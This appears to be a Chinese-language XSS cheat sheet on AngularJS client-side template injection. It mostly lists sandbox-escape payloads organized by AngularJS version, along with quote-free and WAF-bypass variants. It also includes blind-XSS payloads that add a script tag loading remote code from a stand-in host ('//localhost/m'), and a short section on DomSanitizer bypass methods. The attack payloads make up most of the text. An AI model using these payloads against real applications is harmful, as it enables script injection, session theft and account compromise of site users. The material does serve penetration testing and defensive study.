# Angular 和 AngularJS 中的 XSS

## 概述

* [客户端模板注入](#客户端模板注入)
    * [存储型/反射型 XSS](#存储型反射型-xss)
    * [高级绕过 XSS](#高级绕过-xss)
    * [盲 XSS](#盲-xss)
* [自动清理](#自动清理)
* [参考文献](#参考文献)

## 客户端模板注入

以下有效载荷基于客户端模板注入。

### 存储型/反射型 XSS

必须在根元素中存在 `ng-app` 指令以允许客户端注入（参见 [AngularJS: API: ngApp](https://docs.angularjs.org/api/ng/directive/ngApp)）。

> AngularJS 版本 1.6 及以上已完全移除了沙箱机制

AngularJS 1.6+ 由 [Mario Heiderich](https://twitter.com/cure53berlin) 提供

```javascript
{{constructor.constructor('alert(1)')()}}
```

AngularJS 1.6+ 由 [@brutelogic](https://twitter.com/brutelogic/status/1031534746084491265) 提供

```javascript
{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
```

示例可访问 [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?a=%7B%7B[].pop.constructor%26%2340%27alert%5Cu00281%5Cu0029%27%26%2341%26%2340%26%2341%7D%7D)

AngularJS 1.6.0 由 [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830) 提供

```javascript
{{0[a='constructor'][a]('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

AngularJS 1.5.9 - 1.5.11 由 [Jan Horn](https://twitter.com/tehjh) 提供

```javascript
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

AngularJS 1.5.0 - 1.5.8

```javascript
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

AngularJS 1.4.0 - 1.4.9

```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

AngularJS 1.3.20

```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

AngularJS 1.3.19

```javascript
{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;
    $eval('x=alert(1)//');
}}
```

AngularJS 1.3.3 - 1.3.18

```javascript
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}
```

AngularJS 1.3.1 - 1.3.2

```javascript
{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf;
    $eval('x=alert(1)//');
}}
```

AngularJS 1.3.0

```javascript
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
```

AngularJS 1.2.24 - 1.2.29

```javascript
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

AngularJS 1.2.19 - 1.2.23

```javascript
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

AngularJS 1.2.6 - 1.2.18

```javascript
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

AngularJS 1.2.2 - 1.2.5

```javascript
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
```

AngularJS 1.2.0 - 1.2.1

```javascript
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

AngularJS 1.0.1 - 1.1.5 和 Vue JS

```javascript
{{constructor.constructor('alert(1)')()}}
```

### 高级绕过 XSS

AngularJS（无单引号 `'` 和双引号 `"`）由 [@Viren](https://twitter.com/VirenPawar_) 提供

```javascript
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
```

AngularJS（无单引号 `'` 和双引号 `"` 以及字符串 `constructor`）

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

AngularJS 绕过 Waf [Imperva]

```javascript
{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\u{6f}mpt(d\\u{6f}cument.d\\u{6f}main)')()}}
```

### 盲 XSS

1.0.1 - 1.1.5 && > 1.6.0 由 Mario Heiderich (Cure53)

```javascript
{{
    constructor.constructor("var _ = document.createElement('script');
    _.src='//localhost/m';
    document.getElementsByTagName('body')[0].appendChild(_)")()
}}
```

更短版本 1.0.1 - 1.1.5 && > 1.6.0 由 Lewis Ardern (Synopsys) 和 Gareth Heyes (PortSwigger)

```javascript
{{
    $on.constructor("var _ = document.createElement('script');
    _.src='//localhost/m';
    document.getElementsByTagName('body')[0].appendChild(_)")()
}}
```

1.2.0 - 1.2.5 由 Gareth Heyes (PortSwigger)

```javascript
{{
    a="a"["constructor"].prototype;a.charAt=a.trim;
    $eval('a",eval(`var _=document\\x2ecreateElement(\'script\');
    _\\x2esrc=\'//localhost/m\';
    document\\x2ebody\\x2eappendChild(_);`),"')
}}
```

1.2.6 - 1.2.18 由 Jan Horn (Cure53, 现在在 Google Project Zero)

```javascript
{{
    (_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval("
        var _ = document.createElement(\'script\');
        _.src=\'//localhost/m\';
        document.getElementsByTagName(\'body\')[0].appendChild(_)")')()
}}
```

1.2.19 (Firefox) 由 Mathias Karlsson

```javascript
{{
    toString.constructor.prototype.toString=toString.constructor.prototype.call;
    ["a",'eval("var _ = document.createElement(\'script\');
    _.src=\'//localhost/m\';
    document.getElementsByTagName(\'body\')[0].appendChild(_)")'].sort(toString.constructor);
}}
```

1.2.20 - 1.2.29 由 Gareth Heyes (PortSwigger)

```javascript
{{
    a="a"["constructor"].prototype;a.charAt=a.trim;
    $eval('a",eval(`
    var _=document\\x2ecreateElement(\'script\');
    _\\x2esrc=\'//localhost/m\';
    document\\x2ebody\\x2eappendChild(_);`),"')
}}
```

1.3.0 - 1.3.9 由 Gareth Heyes (PortSwigger)

```javascript
{{
    a=toString().constructor.prototype;a.charAt=a.trim;
    $eval('a,eval(`
    var _=document\\x2ecreateElement(\'script\');
    _\\x2esrc=\'//localhost/m\';
    document\\x2ebody\\x2eappendChild(_);`),a')
}}
```

1.4.0 - 1.5.8 由 Gareth Heyes (PortSwigger)

```javascript
{{
    a=toString().constructor.prototype;a.charAt=a.trim;
    $eval('a,eval(`var _=document.createElement(\'script\');
    _.src=\'//localhost/m\';document.body.appendChild(_);`),a')
}}
```

1.5.9 - 1.5.11 由 Jan Horn (Cure53, 现在在 Google Project Zero)

```javascript
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;
    c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(`var _=document.createElement(\\'script\\');_.src=\\'//localhost/m\\';document.body.appendChild(_);`)))+';astNode.argument={type:'Identifier',name:'foo'};");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

## 自动清理

> 为系统性地阻止 XSS 漏洞，Angular 默认将所有值视为不受信任的。当从模板通过属性、属性、样式、类绑定或插值将值插入到 DOM 中时，Angular 会对不受信任的值进行清理和转义。

然而，可以通过以下方法将值标记为受信任并防止自动清理：

* bypassSecurityTrustHtml
* bypassSecurityTrustScript
* bypassSecurityTrustStyle
* bypassSecurityTrustUrl
* bypassSecurityTrustResourceUrl

使用不安全方法 `bypassSecurityTrustUrl` 的组件示例：

```js
import { Component, OnInit } from '@angular/core';

@Component({
  selector: 'my-app',
  template: `
    <h4>一个不受信任的 URL：</h4>
    <p><a class="e2e-dangerous-url" [href]="dangerousUrl">点击我</a></p>
    <h4>一个受信任的 URL：</h4>
    <p><a class="e2e-trusted-url" [href]="trustedUrl">点击我</a></p>
  `,
})
export class App {
  constructor(private sanitizer: DomSanitizer) {
    this.dangerousUrl = 'javascript:alert("Hi there")';
    this.trustedUrl = sanitizer.bypassSecurityTrustUrl(this.dangerousUrl);
  }
}
```

![XSS](https://angular.io/generated/images/guide/security/bypass-security-component.png)

在代码审查时，您需要确保没有用户输入被信任，因为这将在应用程序中引入安全漏洞。

## 参考文献

* [Angular 安全 - 2023 年 5 月 16 日](https://angular.io/guide/security)
* [像亿万富翁一样竞标 - 使用 4 个字符的 CSTI 偷窃 NFT - Matan Berson (@MtnBer) - 2024 年 7 月 11 日](https://matanber.com/blog/4-char-csti)
* [盲 AngularJS XSS 载荷 - Lewis Ardern - 2018 年 12 月 7 日](http://web.archive.org/web/20181209041100/https://ardern.io/2018/12/07/angularjs-bxss/)
* [绕过 DomSanitizer - Swarna (@swarnakishore) - 2017 年 8 月 11 日](https://medium.com/@swarnakishore/angular-safe-pipe-implementation-to-bypass-domsanitizer-stripping-out-content-c1bf0f1cc36b)
* [没有 HTML 的 XSS - Angular JS 的 CSTI - Gareth Heyes (@garethheyes) - 2016 年 1 月 27 日](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)